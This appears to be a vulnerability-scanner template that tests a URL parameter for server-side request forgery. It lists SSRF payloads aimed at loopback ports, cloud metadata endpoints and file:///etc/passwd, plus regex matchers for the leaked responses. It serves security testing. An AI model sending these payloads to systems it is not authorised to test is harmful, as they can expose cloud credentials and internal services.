id: generic-ssrf
info:
  name: Server-Side Request Forgery
  description: Detects SSRF via URL parameter manipulation
  owasp_category: A01:2025
  severity: high
  tags:
    - ssrf
    - request-forgery
    - generic

generic:
  endpoint: "{{ssrf}}"
  method: GET
  parameter: "url"

  payloads:
    - "http://127.0.0.1:80"
    - "http://localhost:80"
    - "http://127.0.0.1:22"
    - "http://localhost:22"
    - "http://127.0.0.1:443"
    - "http://169.254.169.254/latest/meta-data/"
    - "http://metadata.google.internal/computeMetadata/v1/"
    - "file:///etc/passwd"
    - "http://[::1]"
    - "http://2130706433"

  matchers:
    - type: regex
      condition: or
      regex:
        - "root:x:\\d+:\\d+:"
        - "ami-id"
        - "Google"
        - "metadata"
        - "SSH-2\\.0-"
        - "Apache"
        - "nginx"

  matchers_condition: or
